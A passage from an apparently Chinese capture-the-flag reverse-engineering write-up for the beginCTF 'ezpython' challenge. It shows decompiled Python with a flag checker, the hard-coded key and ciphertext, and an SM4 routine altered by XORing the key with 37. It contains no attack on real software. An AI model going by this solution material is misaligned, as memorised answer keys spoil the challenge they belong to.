base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>encrypt_value<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'请输入你的flag:'</span><span class="token punctuation">)</span>    flag <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    sm4_instance <span class="token operator">=</span> SM4<span class="token punctuation">(</span><span class="token punctuation">)</span>    flag_1 <span class="token operator">=</span> sm4_instance<span class="token punctuation">.</span>encryptSM4<span class="token punctuation">(</span>key<span class="token punctuation">,</span> flag<span class="token punctuation">)</span>    <span class="token keyword">if</span> flag_1 <span class="token operator">!=</span> enc<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'flag错误!!'</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'恭喜你获得flag😊😀'</span><span class="token punctuation">)</span><span class="token comment"># okay decompiling .\ezpython.pyc</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>uncompyle secret库</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># Embedded file name: secret.py</span>key <span class="token operator">=</span> <span class="token string">'BeginCTFBeginCTF'</span>enc <span class="token operator">=</span> <span class="token string">b'JmjJEAJGMT6F9bmC+Vyxy8Z1lpfaJzdEX6BGG/qgqUjUpQaYSON1CnZyX9YXTEClSRYm7PFZtGxmJw6LPuw1ww=='</span><span class="token comment"># okay decompiling C:\Users\Npc\Desktop\CTF\beginCTF\beginctfRE\ezpython\ezpython.exe_extracted\PYZ-00.pyz_extracted\secret.pyc</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>加密逻辑实际上是对flag进行一次SM4加密</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># Embedded file name: gmssl\sm4.py</span><span class="token keyword">import</span> copy<span class="token keyword">from</span> <span class="token punctuation">.</span>func <span class="token keyword">import</span> xor<span class="token punctuation">,</span> rotl<span class="token punctuation">,</span> get_uint32_be<span class="token punctuation">,</span> put_uint32_be<span class="token punctuation">,</span> bytes_to_list<span class="token punctuation">,</span> list_to_bytes<span class="token punctuation">,</span> pkcs7_padding<span class="token punctuation">,</span> pkcs7_unpadding<span class="token punctuation">,</span> zero_padding<span class="token punctuation">,</span> zero_unpaddingSM4_BOXES_TABLE <span class="token operator">=</span> <span class="token punctuation">[</span> <span class="token number">214</span><span class="token punctuation">,</span>  <span class="token number">144</span><span class="token punctuation">,</span>  <span class="token number">233</span><span class="token punctuation">,</span>  <span class="token number">254</span><span class="token punctuation">,</span>  <span class="token number">204</span><span class="token punctuation">,</span>  <span class="token number">225</span><span class="token punctuation">,</span>  <span class="token number">61</span><span class="token punctuation">,</span>  <span class="token number">183</span><span class="token punctuation">,</span>  <span class="token number">22</span><span class="token punctuation">,</span>  <span class="token number">182</span><span class="token punctuation">,</span>  <span class="token number">20</span><span class="token punctuation">,</span>  <span class="token number">194</span><span class="token punctuation">,</span>  <span class="token number">40</span><span class="token punctuation">,</span>  <span class="token number">251</span><span class="token punctuation">,</span>  <span class="token number">44</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span>  <span class="token number">43</span><span class="token punctuation">,</span>  <span class="token number">103</span><span class="token punctuation">,</span>  <span class="token number">154</span><span class="token punctuation">,</span>  <span class="token number">118</span><span class="token punctuation">,</span>  <span class="token number">42</span><span class="token punctuation">,</span>  <span class="token number">190</span><span class="token punctuation">,</span>  <span class="token number">4</span><span class="token punctuation">,</span>  <span class="token number">195</span><span class="token punctuation">,</span>  <span class="token number">170</span><span class="token punctuation">,</span>  <span class="token number">68</span><span class="token punctuation">,</span>  <span class="token number">19</span><span class="token punctuation">,</span>  <span class="token number">38</span><span class="token punctuation">,</span>  <span class="token number">73</span><span class="token punctuation">,</span>  <span class="token number">134</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span>  <span class="token number">153</span><span class="token punctuation">,</span>  <span class="token number">156</span><span class="token punctuation">,</span>  <span class="token number">66</span><span class="token punctuation">,</span>  <span class="token number">80</span><span class="token punctuation">,</span>  <span class="token number">244</span><span class="token punctuation">,</span>  <span class="token number">145</span><span class="token punctuation">,</span>  <span class="token number">239</span><span class="token punctuation">,</span>  <span class="token number">152</span><span class="token punctuation">,</span>  <span class="token number">122</span><span class="token punctuation">,</span>  <span class="token number">51</span><span class="token punctuation">,</span>  <span class="token number">84</span><span class="token punctuation">,</span>  <span class="token number">11</span><span class="token punctuation">,</span>  <span class="token number">67</span><span class="token punctuation">,</span>  <span class="token number">237</span><span class="token punctuation">,</span> <span class="token number">207</span><span class="token punctuation">,</span>  <span class="token number">172</span><span class="token punctuation">,</span>  <span class="token number">98</span><span class="token punctuation">,</span>  <span class="token number">228</span><span class="token punctuation">,</span>  <span class="token number">179</span><span class="token punctuation">,</span>  <span class="token number">28</span><span class="token punctuation">,</span>  <span class="token number">169</span><span class="token punctuation">,</span>  <span class="token number">201</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span>  <span class="token number">232</span><span class="token punctuation">,</span>  <span class="token number">149</span><span class="token punctuation">,</span>  <span class="token number">128</span><span class="token punctuation">,</span>  <span class="token number">223</span><span class="token punctuation">,</span>  <span class="token number">148</span><span class="token punctuation">,</span>  <span class="token number">250</span><span class="token punctuation">,</span> <span class="token number">117</span><span class="token punctuation">,</span>  <span class="token number">143</span><span class="token punctuation">,</span>  <span class="token number">63</span><span class="token punctuation">,</span>  <span class="token number">166</span><span class="token punctuation">,</span>  <span class="token number">71</span><span class="token punctuation">,</span>  <span class="token number">7</span><span class="token punctuation">,</span>  <span class="token number">167</span><span class="token punctuation">,</span>  <span class="token number">252</span><span class="token punctuation">,</span>  <span class="token number">243</span><span class="token punctuation">,</span>  <span class="token number">115</span><span class="token punctuation">,</span>  <span class="token number">23</span><span class="token punctuation">,</span>  <span class="token number">186</span><span class="token punctuation">,</span>  <span class="token number">131</span><span class="token punctuation">,</span>  <span class="token number">89</span><span class="token punctuation">,</span>  <span class="token number">60</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">,</span>  <span class="token number">230</span><span class="token punctuation">,</span>  <span class="token number">133</span><span class="token punctuation">,</span>  <span class="token number">79</span><span class="token punctuation">,</span>  <span class="token number">168</span><span class="token punctuation">,</span>  <span class="token number">104</span><span class="token punctuation">,</span>  <span class="token number">107</span><span class="token punctuation">,</span>  <span class="token number">129</span><span class="token punctuation">,</span>  <span class="token number">178</span><span class="token punctuation">,</span>  <span class="token number">113</span><span class="token punctuation">,</span>  <span class="token number">100</span><span class="token punctuation">,</span>  <span class="token number">218</span><span class="token punctuation">,</span>  <span class="token number">139</span><span class="token punctuation">,</span>  <span class="token number">248</span><span class="token punctuation">,</span>  <span class="token number">235</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span>  <span class="token number">75</span><span class="token punctuation">,</span>  <span class="token number">112</span><span class="token punctuation">,</span>  <span class="token number">86</span><span class="token punctuation">,</span>  <span class="token number">157</span><span class="token punctuation">,</span>  <span class="token number">53</span><span class="token punctuation">,</span>  <span class="token number">30</span><span class="token punctuation">,</span>  <span class="token number">36</span><span class="token punctuation">,</span>  <span class="token number">14</span><span class="token punctuation">,</span>  <span class="token number">94</span><span class="token punctuation">,</span>  <span class="token number">99</span><span class="token punctuation">,</span>  <span class="token number">88</span><span class="token punctuation">,</span>  <span class="token number">209</span><span class="token punctuation">,</span>  <span class="token number">162</span><span class="token punctuation">,</span>  <span class="token number">37</span><span class="token punctuation">,</span> <span class="token number">34</span><span class="token punctuation">,</span>  <span class="token number">124</span><span class="token punctuation">,</span>  <span class="token number">59</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">,</span>  <span class="token number">33</span><span class="token punctuation">,</span>  <span class="token number">120</span><span class="token punctuation">,</span>  <span class="token number">135</span><span class="token punctuation">,</span>  <span class="token number">212</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">70</span><span class="token punctuation">,</span>  <span class="token number">87</span><span class="token punctuation">,</span>  <span class="token number">159</span><span class="token punctuation">,</span>  <span class="token number">211</span><span class="token punctuation">,</span>  <span class="token number">39</span><span class="token punctuation">,</span>  <span class="token number">82</span><span class="token punctuation">,</span> <span class="token number">76</span><span class="token punctuation">,</span>  <span class="token number">54</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span>  <span class="token number">231</span><span class="token punctuation">,</span>  <span class="token number">160</span><span class="token punctuation">,</span>  <span class="token number">196</span><span class="token punctuation">,</span>  <span class="token number">200</span><span class="token punctuation">,</span>  <span class="token number">158</span><span class="token punctuation">,</span>  <span class="token number">234</span><span class="token punctuation">,</span>  <span class="token number">191</span><span class="token punctuation">,</span>  <span class="token number">138</span><span class="token punctuation">,</span>  <span class="token number">210</span><span class="token punctuation">,</span>  <span class="token number">64</span><span class="token punctuation">,</span>  <span class="token number">199</span><span class="token punctuation">,</span>  <span class="token number">56</span><span class="token punctuation">,</span> <span class="token number">181</span><span class="token punctuation">,</span>  <span class="token number">163</span><span class="token punctuation">,</span>  <span class="token number">247</span><span class="token punctuation">,</span>  <span class="token number">242</span><span class="token punctuation">,</span>  <span class="token number">206</span><span class="token punctuation">,</span>  <span class="token number">249</span><span class="token punctuation">,</span>  <span class="token number">97</span><span class="token punctuation">,</span>  <span class="token number">21</span><span class="token punctuation">,</span>  <span class="token number">161</span><span class="token punctuation">,</span>  <span class="token number">224</span><span class="token punctuation">,</span>  <span class="token number">174</span><span class="token punctuation">,</span>  <span class="token number">93</span><span class="token punctuation">,</span>  <span class="token number">164</span><span class="token punctuation">,</span>  <span class="token number">155</span><span class="token punctuation">,</span>  <span class="token number">52</span><span class="token punctuation">,</span> <span class="token number">26</span><span class="token punctuation">,</span>  <span class="token number">85</span><span class="token punctuation">,</span>  <span class="token number">173</span><span class="token punctuation">,</span>  <span class="token number">147</span><span class="token punctuation">,</span>  <span class="token number">50</span><span class="token punctuation">,</span>  <span class="token number">48</span><span class="token punctuation">,</span>  <span class="token number">245</span><span class="token punctuation">,</span>  <span class="token number">140</span><span class="token punctuation">,</span>  <span class="token number">177</span><span class="token punctuation">,</span>  <span class="token number">227</span><span class="token punctuation">,</span>  <span class="token number">29</span><span class="token punctuation">,</span>  <span class="token number">246</span><span class="token punctuation">,</span>  <span class="token number">226</span><span class="token punctuation">,</span>  <span class="token number">46</span><span class="token punctuation">,</span>  <span class="token number">130</span><span class="token punctuation">,</span> <span class="token number">102</span><span class="token punctuation">,</span>  <span class="token number">202</span><span class="token punctuation">,</span>  <span class="token number">96</span><span class="token punctuation">,</span>  <span class="token number">192</span><span class="token punctuation">,</span>  <span class="token number">41</span><span class="token punctuation">,</span>  <span class="token number">35</span><span class="token punctuation">,</span>  <span class="token number">171</span><span class="token punctuation">,</span>  <span class="token number">13</span><span class="token punctuation">,</span>  <span class="token number">83</span><span class="token punctuation">,</span>  <span class="token number">78</span><span class="token punctuation">,</span>  <span class="token number">111</span><span class="token punctuation">,</span>  <span class="token number">213</span><span class="token punctuation">,</span>  <span class="token number">219</span><span class="token punctuation">,</span>  <span class="token number">55</span><span class="token punctuation">,</span>  <span class="token number">69</span><span class="token punctuation">,</span> <span class="token number">222</span><span class="token punctuation">,</span>  <span class="token number">253</span><span class="token punctuation">,</span>  <span class="token number">142</span><span class="token punctuation">,</span>  <span class="token number">47</span><span class="token punctuation">,</span>  <span class="token number">3</span><span class="token punctuation">,</span>  <span class="token number">255</span><span class="token punctuation">,</span>  <span class="token number">106</span><span class="token punctuation">,</span>  <span class="token number">114</span><span class="token punctuation">,</span>  <span class="token number">109</span><span class="token punctuation">,</span>  <span class="token number">108</span><span class="token punctuation">,</span>  <span class="token number">91</span><span class="token punctuation">,</span>  <span class="token number">81</span><span class="token punctuation">,</span>  <span class="token number">141</span><span class="token punctuation">,</span>  <span class="token number">27</span><span class="token punctuation">,</span>  <span class="token number">175</span><span class="token punctuation">,</span> <span class="token number">146</span><span class="token punctuation">,</span>  <span class="token number">187</span><span class="token punctuation">,</span>  <span class="token number">221</span><span class="token punctuation">,</span>  <span class="token number">188</span><span class="token punctuation">,</span>  <span class="token number">127</span><span class="token punctuation">,</span>  <span class="token number">17</span><span class="token punctuation">,</span>  <span class="token number">217</span><span class="token punctuation">,</span>  <span class="token number">92</span><span class="token punctuation">,</span>  <span class="token number">65</span><span class="token punctuation">,</span>  <span class="token number">31</span><span class="token punctuation">,</span>  <span class="token number">16</span><span class="token punctuation">,</span>  <span class="token number">90</span><span class="token punctuation">,</span>  <span class="token number">216</span><span class="token punctuation">,</span>  <span class="token number">10</span><span class="token punctuation">,</span>  <span class="token number">193</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span>  <span class="token number">136</span><span class="token punctuation">,</span>  <span class="token number">165</span><span class="token punctuation">,</span>  <span class="token number">205</span><span class="token punctuation">,</span>  <span class="token number">123</span><span class="token punctuation">,</span>  <span class="token number">189</span><span class="token punctuation">,</span>  <span class="token number">45</span><span class="token punctuation">,</span>  <span class="token number">116</span><span class="token punctuation">,</span>  <span class="token number">208</span><span class="token punctuation">,</span>  <span class="token number">18</span><span class="token punctuation">,</span>  <span class="token number">184</span><span class="token punctuation">,</span>  <span class="token number">229</span><span class="token punctuation">,</span>  <span class="token number">180</span><span class="token punctuation">,</span>  <span class="token number">176</span><span class="token punctuation">,</span>  <span class="token number">137</span><span class="token punctuation">,</span> <span class="token number">105</span><span class="token punctuation">,</span>  <span class="token number">151</span><span class="token punctuation">,</span>  <span class="token number">74</span><span class="token punctuation">,</span>  <span class="token number">12</span><span class="token punctuation">,</span>  <span class="token number">150</span><span class="token punctuation">,</span>  <span class="token number">119</span><span class="token punctuation">,</span>  <span class="token number">126</span><span class="token punctuation">,</span>  <span class="token number">101</span><span class="token punctuation">,</span>  <span class="token number">185</span><span class="token punctuation">,</span>  <span class="token number">241</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span>  <span class="token number">197</span><span class="token punctuation">,</span>  <span class="token number">110</span><span class="token punctuation">,</span>  <span class="token number">198</span><span class="token punctuation">,</span>  <span class="token number">132</span><span class="token punctuation">,</span> <span class="token number">24</span><span class="token punctuation">,</span>  <span class="token number">240</span><span class="token punctuation">,</span>  <span class="token number">125</span><span class="token punctuation">,</span>  <span class="token number">236</span><span class="token punctuation">,</span>  <span class="token number">58</span><span class="token punctuation">,</span>  <span class="token number">220</span><span class="token punctuation">,</span>  <span class="token number">77</span><span class="token punctuation">,</span>  <span class="token number">32</span><span class="token punctuation">,</span>  <span class="token number">121</span><span class="token punctuation">,</span>  <span class="token number">238</span><span class="token punctuation">,</span>  <span class="token number">95</span><span class="token punctuation">,</span>  <span class="token number">62</span><span class="token punctuation">,</span>  <span class="token number">215</span><span class="token punctuation">,</span>  <span class="token number">203</span><span class="token punctuation">,</span>  <span class="token number">57</span><span class="token punctuation">,</span> <span class="token number">72</span><span class="token punctuation">]</span>SM4_FK <span class="token operator">=</span> <span class="token punctuation">[</span> <span class="token number">2746333894</span><span class="token punctuation">,</span> <span class="token number">1453994832</span><span class="token punctuation">,</span> <span class="token number">1736282519</span><span class="token punctuation">,</span> <span class="token number">2993693404</span><span class="token punctuation">]</span>SM4_CK <span class="token operator">=</span> <span class="token punctuation">[</span> <span class="token number">462357</span><span class="token punctuation">,</span>  <span class="token number">472066609</span><span class="token punctuation">,</span>  <span class="token number">943670861</span><span class="token punctuation">,</span>  <span class="token number">1415275113</span><span class="token punctuation">,</span> <span class="token number">1886879365</span><span class="token punctuation">,</span>  <span class="token number">2358483617</span><span class="token punctuation">,</span>  <span class="token number">2830087869</span><span class="token punctuation">,</span>  <span class="token number">3301692121</span><span class="token punctuation">,</span> <span class="token number">3773296373</span><span class="token punctuation">,</span>  <span class="token number">4228057617</span><span class="token punctuation">,</span>  <span class="token number">404694573</span><span class="token punctuation">,</span>  <span class="token number">876298825</span><span class="token punctuation">,</span> <span class="token number">1347903077</span><span class="token punctuation">,</span>  <span class="token number">1819507329</span><span class="token punctuation">,</span>  <span class="token number">2291111581</span><span class="token punctuation">,</span>  <span class="token number">2762715833</span><span class="token punctuation">,</span> <span class="token number">3234320085</span><span class="token punctuation">,</span>  <span class="token number">3705924337</span><span class="token punctuation">,</span>  <span class="token number">4177462797</span><span class="token punctuation">,</span>  <span class="token number">337322537</span><span class="token punctuation">,</span> <span class="token number">808926789</span><span class="token punctuation">,</span>  <span class="token number">1280531041</span><span class="token punctuation">,</span>  <span class="token number">1752135293</span><span class="token punctuation">,</span>  <span class="token number">2223739545</span><span class="token punctuation">,</span> <span class="token number">2695343797</span><span class="token punctuation">,</span>  <span class="token number">3166948049</span><span class="token punctuation">,</span>  <span class="token number">3638552301</span><span class="token punctuation">,</span>  <span class="token number">4110090761</span><span class="token punctuation">,</span> <span class="token number">269950501</span><span class="token punctuation">,</span>  <span class="token number">741554753</span><span class="token punctuation">,</span>  <span class="token number">1213159005</span><span class="token punctuation">,</span>  <span class="token number">1684763257</span><span class="token punctuation">]</span>SM4_ENCRYPT <span class="token operator">=</span> <span class="token number">0</span>SM4_DECRYPT <span class="token operator">=</span> <span class="token number">1</span>PKCS7 <span class="token operator">=</span> <span class="token number">0</span>ZERO <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">class</span> <span class="token class-name">CryptSM4</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> mode<span class="token operator">=</span>SM4_ENCRYPT<span class="token punctuation">,</span> padding_mode<span class="token operator">=</span>PKCS7<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>sk <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">32</span>        self<span class="token punctuation">.</span>mode <span class="token operator">=</span> mode        self<span class="token punctuation">.</span>padding_mode <span class="token operator">=</span> padding_mode    <span class="token decorator annotation punctuation">@classmethod</span>    <span class="token keyword">def</span> <span class="token function">_round_key</span><span class="token punctuation">(</span>cls<span class="token punctuation">,</span> ka<span class="token punctuation">)</span><span class="token punctuation">:</span>        b <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span>        a <span class="token operator">=</span> put_uint32_be<span class="token punctuation">(</span>ka<span class="token punctuation">)</span>        b<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> SM4_BOXES_TABLE<span class="token punctuation">[</span>a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span>        b<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> SM4_BOXES_TABLE<span class="token punctuation">[</span>a<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span>        b<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> SM4_BOXES_TABLE<span class="token punctuation">[</span>a<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">]</span>        b<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> SM4_BOXES_TABLE<span class="token punctuation">[</span>a<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">]</span>        bb <span class="token operator">=</span> get_uint32_be<span class="token punctuation">(</span>b<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        rk <span class="token operator">=</span> bb <span class="token operator">^</span> rotl<span class="token punctuation">(</span>bb<span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">)</span> <span class="token operator">^</span> rotl<span class="token punctuation">(</span>bb<span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> rk    <span class="token decorator annotation punctuation">@classmethod</span>    <span class="token keyword">def</span> <span class="token function">_f</span><span class="token punctuation">(</span>cls<span class="token punctuation">,</span> x0<span class="token punctuation">,</span> x1<span class="token punctuation">,</span> x2<span class="token punctuation">,</span> x3<span class="token punctuation">,</span> rk<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">def</span> <span class="token function">_sm4_l_t</span><span class="token punctuation">(</span>ka<span class="token punctuation">)</span><span class="token punctuation">:</span>            b <span class="token operator">=</span> <span class="token punctuation">[</span>             <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span>            a <span class="token operator">=</span> put_uint32_be<span class="token punctuation">(</span>ka<span class="token punctuation">)</span>            b<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> SM4_BOXES_TABLE<span class="token punctuation">[</span>a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span>            b<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> SM4_BOXES_TABLE<span class="token punctuation">[</span>a<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span>            b<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> SM4_BOXES_TABLE<span class="token punctuation">[</span>a<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">]</span>            b<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> SM4_BOXES_TABLE<span class="token punctuation">[</span>a<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">]</span>            bb <span class="token operator">=</span> get_uint32_be<span class="token punctuation">(</span>b<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            c <span class="token operator">=</span> bb <span class="token operator">^</span> rotl<span class="token punctuation">(</span>bb<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">^</span> rotl<span class="token punctuation">(</span>bb<span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span> <span class="token operator">^</span> rotl<span class="token punctuation">(</span>bb<span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">)</span> <span class="token operator">^</span> rotl<span class="token punctuation">(</span>bb<span class="token punctuation">,</span> <span class="token number">24</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> c        <span class="token keyword">return</span> x0 <span class="token operator">^</span> _sm4_l_t<span class="token punctuation">(</span>x1 <span class="token operator">^</span> x2 <span class="token operator">^</span> x3 <span class="token operator">^</span> rk<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">set_key</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> key<span class="token punctuation">,</span> mode<span class="token punctuation">)</span><span class="token punctuation">:</span>        key <span class="token operator">=</span> bytes_to_list<span class="token punctuation">(</span>key<span class="token punctuation">)</span>        key <span class="token operator">=</span> <span class="token punctuation">[</span>k <span class="token operator">^</span> <span class="token number">37</span> <span class="token keyword">for</span> k <span class="token keyword">in</span> key<span class="token punctuation">]</span>        MK <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span>        k <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">36</span>        MK<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> get_uint32_be<span class="token punctuation">(</span>key<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        MK<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> get_uint32_be<span class="token punctuation">(</span>key<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        MK<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> get_uint32_be<span class="token punctuation">(</span>key<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        MK<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> get_uint32_be<span class="token punctuation">(</span>key<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">:</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        k<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> xor<span class="token punctuation">(</span>MK<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span> SM4_FK<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            k<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> k<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> self<span class="token punctuation">.</span>_round_key<span class="token punctuation">(</span>k<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">^</span> k<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">^</span> k<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">^</span> SM4_CK<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>            self<span class="token punctuation">.</span>sk<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> k<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">]</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>mode <span class="token operator">=</span> mode            <span class="token keyword">if</span> mode <span class="token operator">==</span> SM4_DECRYPT<span class="token punctuation">:</span>                <span class="token keyword">for</span> idx <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    t <span class="token operator">=</span> self<span class="token punctuation">.</span>sk<span class="token punctuation">[</span>idx<span class="token punctuation">]</span>                    self<span class="token punctuation">.</span>sk<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">=</span> self<span class="token punctuation">.</span>sk<span class="token punctuation">[</span><span class="token number">31</span> <span class="token operator">-</span> idx<span class="token punctuation">]</span>                    self<span class="token punctuation">.</span>sk<span class="token punctuation">[</span><span class="token number">31</span> <span class="token operator">-</span> idx<span class="token punctuation">]</span> <span class="token operator">=</span> t    <span class="token keyword">def</span> <span class="token function">one_round</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> sk<span class="token punctuation">,</span> in_put<span class="token punctuation">)</span><span class="token punctuation">:</span>        out_put <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        ulbuf <span class="token operator">=</span> <span class="token punctuation">[</span>         <span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">36</span>        ulbuf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> get_uint32_be<span class="token punctuation">(</span>in_put<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        ulbuf<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> get_uint32_be<span class="token punctuation">(</span>in_put<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        ulbuf<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> get_uint32_be<span class="token punctuation">(</span>in_put<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token 